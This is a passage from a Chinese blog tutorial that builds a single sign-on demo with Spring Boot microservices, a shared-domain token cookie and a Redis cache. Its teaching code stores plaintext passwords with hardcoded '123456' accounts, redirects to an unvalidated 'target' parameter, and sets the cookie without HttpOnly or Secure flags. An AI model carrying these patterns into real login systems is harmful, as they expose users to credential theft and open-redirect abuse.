<p>以下是SSO的主要特点和优势：</p>
<ol>
<li><strong>单一身份验证：</strong> 用户只需一次登录，即可访问多个不同的应用程序和服务，而无需为每个应用程序都提供凭据。</li>
<li><strong>降低用户认证负担：</strong> SSO减少了用户需要记住的用户名和密码数量，降低了用户认证的负担，提高了用户体验。</li>
<li><strong>中心化身份管理：</strong> SSO通常包括一个中心身份提供者（Identity Provider，IdP），负责管理用户身份和权限。这简化了身份和权限管理，使得可以更容易地添加、修改和删除用户。</li>
<li><strong>增强安全性：</strong> 尽管只需要一次登录，但SSO可以提供强大的安全性，包括多因素身份验证（MFA）和单点注销（Single Log-Out）等功能，以确保用户数据和应用程序的安全性。</li>
<li><strong>集成多种协议：</strong> SSO可以支持多种身份验证和授权协议，如SAML（Security Assertion Markup Language）、OAuth、OpenID Connect等，以适应不同应用程序和服务的需求。</li>
</ol>
<p>例如你登录网易账号中心（<a href="https://reg.163.com/">https://reg.163.com/</a> ）之后访问以下站点都是登录状态。</p>
<ul>
<li>网易直播 <a href="https://v.163.com/">https://v.163.comopen in new window</a></li>
<li>网易博客 <a href="https://blog.163.com/">https://blog.163.comopen in new window</a></li>
<li>网易花田 <a href="https://love.163.com/">https://love.163.comopen in new window</a></li>
<li>网易考拉 <a href="https://www.kaola.com/">https://www.kaola.comopen in new window</a></li>
<li>网易 Lofter <a href="http://www.lofter.com/">http://www.lofter.comopen in new window</a></li>
</ul>
<p>那么如何动手实现一个SSO框架？</p>
<h1 id="SSO-demo"><a href="#SSO-demo" class="headerlink" title="SSO-demo"></a>SSO-demo</h1><h2 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h2><p>首先创建maven父工程，其pom.xml如下</p>
<pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>
         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;
    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;

    &lt;groupId&gt;org.example&lt;/groupId&gt;
    &lt;artifactId&gt;sso_demo&lt;/artifactId&gt;
    &lt;packaging&gt;pom&lt;/packaging&gt;
    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;

    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;relativePath/&gt;
        &lt;version&gt;<span class="hljs-number">2.6</span><span class="hljs-number">.7</span>&lt;/version&gt;
    &lt;/parent&gt;

    &lt;modules&gt;
        &lt;<span class="hljs-keyword">module</span>&gt;sso-vip&lt;/<span class="hljs-keyword">module</span>&gt;
        &lt;<span class="hljs-keyword">module</span>&gt;sso-cart&lt;/<span class="hljs-keyword">module</span>&gt;
        &lt;<span class="hljs-keyword">module</span>&gt;sso-main&lt;/<span class="hljs-keyword">module</span>&gt;
        &lt;<span class="hljs-keyword">module</span>&gt;sso-login&lt;/<span class="hljs-keyword">module</span>&gt;
    &lt;/modules&gt;

    &lt;properties&gt;
        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
            &lt;version&gt;<span class="hljs-number">1.18</span><span class="hljs-number">.24</span>&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
            &lt;version&gt;<span class="hljs-number">2.6</span><span class="hljs-number">.7</span>&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
            &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.1</span>&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

&lt;/project&gt;</code></pre>

<p>可以看到，其有三个子工程sso-vip、sso-login、sso-cart、sso-main，都为Spring-boot项目，提供网页服务</p>
<pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;
&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>
         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;
    &lt;parent&gt;
        &lt;artifactId&gt;sso_demo&lt;/artifactId&gt;
        &lt;groupId&gt;org.example&lt;/groupId&gt;
        &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;
    &lt;/parent&gt;
    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;

    &lt;artifactId&gt;sso-login&lt;/artifactId&gt;

    &lt;properties&gt;
        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;
    &lt;/properties&gt;

&lt;/project&gt;</code></pre>

<p>这四个模块在一起就很像电商平台的四个微服务，分别运行在不同的端口下。</p>
<p>其中main运行在</p>
<table>
<thead>
<tr>
<th>server</th>
<th>port</th>
<th>url</th>
</tr>
</thead>
<tbody><tr>
<td>sso-main</td>
<td>9010</td>
<td><a href="http://www.codeshop.com:9010/">www.codeshop.com:9010</a></td>
</tr>
<tr>
<td>sso-vip</td>
<td>9011</td>
<td>vip.codeshop.com:9011</td>
</tr>
<tr>
<td>sso-cart</td>
<td>9012</td>
<td>cart.codeshop.com:9012</td>
</tr>
<tr>
<td>sso-login</td>
<td>9000</td>
<td>login.codeshop.com:9000</td>
</tr>
</tbody></table>
<p>在hosts文件中添加一下内容</p>
<pre><code class="hljs sh">sudo vim /etc/hosts</code></pre>

<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>	www.codeshop.com
<span class="hljs-number">127.0.0.1</span>	vip.codeshop.com
<span class="hljs-number">127.0.0.1</span>	cart.codeshop.com
<span class="hljs-number">127.0.0.1</span>	login.codeshop.com</code></pre>

<p>访问时记得清除浏览器缓存，不然可能访问不到。</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><h3 id="非登录模块"><a href="#非登录模块" class="headerlink" title="非登录模块"></a>非登录模块</h3><p>当用户访问<a href="http://www.codeshop.com:9010时其可以不登录账号，但是访问vip.codeshop.com:9011、">www.codeshop.com:9010时其可以不登录账号，但是访问vip.codeshop.com:9011、</a> cart.codeshop.com:9012则必须要跳转到login.codeshop.com:9000，进行登录操作。如下图所示逻辑。</p>
<p><img src="https://oss.javaguide.cn/github/javaguide/system-design/security/sso/sso-logincheck-sequence.png-kbrb.png" alt="SSO系统设计-登录信息获取/登录状态校验"></p>
<p>那么前端代码逻辑就是</p>
<ul>
<li>首先判断用户是否登录</li>
<li>如果用户登录，则从session中获取保存的用户信息，如用户名</li>
<li>如果用户没登录，则需要跳转到登录页面</li>
<li>在用户登录完成后，需要返回到原来的页面，并且显示登录的用户信息，所以在访问登录页面时，需要携带参数，用于跳转回原来页面</li>
</ul>
<p>下面以vip页面为例，其他页面同理</p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>VIP模块<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>VIP服务!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:if</span>=<span class="hljs-string">&quot;$&#123;session.loginUser == null&#125;&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://login.codeshop.com:9000/view/login?target=http://vip.codeshop.com:9011/view/index&quot;</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:unless</span>=<span class="hljs-string">&quot;$&#123;session.loginUser == null&#125;&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://vip.codeshop.com:9011/view/logout?target=http://vip.codeshop.com:9011/view/index&quot;</span>&gt;</span>logout<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:unless</span>=<span class="hljs-string">&quot;$&#123;session.loginUser == null&#125;&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: cadetblue&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;session.loginUser.username&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> 登录成功! <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
        用户id: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:cadetblue&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;session.loginUser.id&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
        用户名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:cadetblue&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;session.loginUser.username&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>

<p>后端代码如下</p>
<pre><code class="hljs java"><span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping(&quot;/view&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RestTemplate restTemplate;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">USER_INFO_ADDRESS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://login.codeshop.com:9000/login/info?token=&quot;</span>;

    <span class="hljs-meta">@GetMapping(&quot;/index&quot;)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toIndex</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(required = false, value = &quot;TOKEN&quot;)</span> Cookie cookie,</span>
<span class="hljs-params">                          HttpSession session)</span> &#123;
        <span class="hljs-keyword">if</span> (cookie != <span class="hljs-literal">null</span>) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> cookie.getValue();
            <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(token)) &#123;
                <span class="hljs-type">Map</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> restTemplate.getForObject(USER_INFO_ADDRESS + token, Map.class);
                session.setAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>, result);
            &#125;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;
    &#125;
&#125;</code></pre>

<p>其中RestTemplate的作用是用于http调用，在微服务框架中，每个服务独立，所以vip模块无法直接调用login的函数，所以使用http进行调用</p>
<p>在启动类上要进行Bean的注册</p>
<pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VipApp</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        SpringApplication.run(VipApp.class,args);
    &#125;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RestTemplate <span class="hljs-title function_">restTemplate</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    &#125;
&#125;</code></pre>



<h3 id="登录模块"><a href="#登录模块" class="headerlink" title="登录模块"></a>登录模块</h3><p>前段页面，只要提供两个输入框，接受用户名和密码</p>
<pre><code class="hljs java">&lt;!DOCTYPE html&gt;
&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> xmlns:th=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;
&lt;head&gt;
    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;
    &lt;title&gt;Login Module&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;用户登录 &lt;/h1&gt;
    &lt;p style=<span class="hljs-string">&quot;color: red;&quot;</span> th:text=<span class="hljs-string">&quot;$&#123;session.msg&#125;&quot;</span>&gt;&lt;/p&gt;
    &lt;form action=<span class="hljs-string">&quot;/login&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;
        姓名:  &lt;input name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;
        &lt;br&gt;&lt;/br&gt;
        密码:  &lt;input name=<span class="hljs-string">&quot;password&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt;
        &lt;br&gt;&lt;/br&gt;
        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span> style=<span class="hljs-string">&quot;width:60px;height:30px&quot;</span>&gt; login &lt;/button&gt;
    &lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>创建用户实体，用于模拟</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span> <span class="hljs-comment">//添加getter/setter</span>
<span class="hljs-meta">@NoArgsConstructor</span>  <span class="hljs-comment">//添加无参构造器</span>
<span class="hljs-meta">@AllArgsConstructor</span> <span class="hljs-comment">//添加全参构造器</span>
<span class="hljs-meta">@Accessors(chain = true)</span> <span class="hljs-comment">//添加链式调用</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;
    <span class="hljs-keyword">private</span> Integer id;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String password;
&#125;
</code></pre>

<p>控制器代码逻辑<code>http://login.codeshop.com:9000/view/login</code></p>
<ul>
<li>首先判断是否有target参数，如果没有跳转到<code>login.codeshop.com:9010</code>进行登录</li>
<li>然后判断是否请求的cookie中是否携带token</li>
<li>如果携带token，用户已完成登录，从缓存中获取用户信息返回即可</li>
<li>没有携带token则需要<code>/login</code>下完成登录</li>
</ul>
<pre><code class="hljs java"><span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping(&quot;/view&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span> &#123;
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 跳转到登录页面</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toLogin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(required = false, defaultValue = &quot;&quot;)</span> String target,</span>
<span class="hljs-params">                          HttpSession session,</span>
<span class="hljs-params">                          <span class="hljs-meta">@CookieValue(required = false, value = &quot;TOKEN&quot;)</span> Cookie cookie)</span>&#123;
        <span class="hljs-keyword">if</span>(StringUtils.isEmpty(target))&#123;
            target = <span class="hljs-string">&quot;login.codeshop.com:9010&quot;</span>;
        &#125;
        <span class="hljs-keyword">if</span>(cookie != <span class="hljs-literal">null</span>)&#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cookie.getValue();
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> LogCacheUtil.loginUser.get(value);
            <span class="hljs-keyword">if</span>(user != <span class="hljs-literal">null</span>)&#123;
                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + target;
            &#125;
        &#125;
        session.setAttribute(<span class="hljs-string">&quot;target&quot;</span>,target);
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;
    &#125;

&#125;</code></pre>

<p><code>/login</code>登录模块的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping(&quot;/login&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Set&lt;User&gt; dbUser;

  <span class="hljs-comment">// 模拟用户数据</span>
    <span class="hljs-keyword">static</span> &#123;
        dbUser = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
        dbUser.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;adx&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>));
        dbUser.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>));
    &#125;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">doLogin</span><span class="hljs-params">(User user, HttpSession session, HttpServletResponse response)</span> &#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;target&quot;</span>);
        Optional&lt;User&gt; first = dbUser.stream().filter(dbUser -&gt; dbUser.getUsername().equals(user.getUsername()) &amp;&amp;
                dbUser.getPassword().equals(user.getPassword()))
                .findFirst();
        <span class="hljs-keyword">if</span> (first.isPresent()) &#123;
         		<span class="hljs-comment">// 使用随机数作为token</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
            <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;TOKEN&quot;</span>, token);
            cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);
          	<span class="hljs-comment">// 设置token的作用域名</span>
            cookie.setDomain(<span class="hljs-string">&quot;codeshop.com&quot;</span>);
          	<span class="hljs-comment">// 在响应头中添加cookie</span>
            response.addCookie(cookie);
          	<span class="hljs-comment">// 保存已登录用户信息</span>
            LogCacheUtil.loginUser.put(token, first.get());
        &#125; <span class="hljs-keyword">else</span> &#123;
            session.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码错误!&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + target;
    &#125;

  	<span class="hljs-comment">/**</span>
<span class="hljs-comment">  		根据token获取用户在缓存中的信息</span>
<span class="hljs-comment">  	*/</span>
    <span class="hljs-meta">@GetMapping(&quot;info&quot;)</span>
    <span class="hljs-meta">@ResponseBody</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;User&gt; <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(String token)</span> &#123;
        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(token)) &#123;
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> LogCacheUtil.loginUser.get(token);
            <span class="hljs-keyword">return</span> ResponseEntity.ok(user);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-literal">null</span>, HttpStatus.BAD_REQUEST);
        &#125;
    &#125;

   	<span class="hljs-comment">/**</span>
<span class="hljs-comment">   	退出操作</span>
<span class="hljs-comment">   	*/</span>
    <span class="hljs-meta">@GetMapping(&quot;/logout&quot;)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">loginOut</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;TOKEN&quot;)</span> Cookie cookie, HttpServletResponse response, String target)</span> &#123;
        <span class="hljs-comment">// 将cookie的过期时间修改为0</span>
        cookie.setMaxAge(<span class="hljs-number">0</span>);
       <span class="hljs-comment">// 从缓存中删除用户的信息 </span>
        LogCacheUtil.loginUser.remove(cookie.getValue());
        response.addCookie(cookie);
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + target;
    &#125;
&#125;
</code></pre>

<p>后端响应后，返回本次登录的cookie，前端在获取cookie后，会将信息保存到浏览器中。</p>
<p><img src="/2023/09/10/sso/image-20230910181048549.png" alt="image-20230910181048549"></p>
<p>此时登录的是<a href="http://www.codeshop.com/">www.codeshop.com</a></p>
<p>当访问vip.codeshop.com时，就会发现，用登录也可以获取到登录用户的信息。</p>
<h2 id="使用redis缓存用户token"><a href="#使用redis缓存用户token" class="headerlink" title="使用redis缓存用户token"></a>使用redis缓存用户token</h2><p>整合redis</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<p>在父工程的pom文件中添加依赖，版本与使用springboot保持一致</p>
<p>添加操作redis的工具类，注意这个不添加也不影响，添加了后，使用redis更加方便简捷，不添加的话可以直接使用RedisTemplate进行操作，效果是一样的</p>
<pre><code class="hljs java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisUtils</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, String&gt; redisTemplate;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 读取缓存</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key)</span> &#123;
        <span class="hljs-keyword">return</span> redisTemplate.opsForValue().get(key);
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 写入缓存</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">set</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, String value)</span> &#123;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> &#123;
            redisTemplate.opsForValue().set(key, value);
            result = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
        <span class="hljs-keyword">return</span> result;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 写入缓存,并设置过期时间</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> key</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> value</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> timeout</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> unit</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">set</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, String value, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> &#123;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> &#123;
            redisTemplate.opsForValue().set(key, value, timeout, unit);
            result = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
        <span class="hljs-keyword">return</span> result;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 更新缓存</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">getAndSet</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, String value)</span> &#123;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> &#123;
            redisTemplate.opsForValue().getAndSet(key, value);
            result = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
        <span class="hljs-keyword">return</span> result;
    &#125;

    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * 删除缓存</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key)</span> &#123;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">try</span> &#123;
            redisTemplate.delete(key);
            result = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
        &#125;
        <span class="hljs-keyword">return</span> result;
    &#125;
&#125;</code></pre>

<p>修改登录模块从缓存中获取token的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">toLogin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(required = false, defaultValue = &quot;&quot;)</span> String target,</span>
<span class="hljs-params">                      HttpSession session,</span>
<span class="hljs-params">                      <span class="hljs-meta">@CookieValue(required = false, value = &quot;TOKEN&quot;)</span> Cookie cookie)</span>&#123;
    <span class="hljs-keyword">if</span>(StringUtils.isEmpty(target))&#123;
        target = <span class="hljs-string">&quot;login.codeshop.com:9010&quot;</span>;
    &#125;
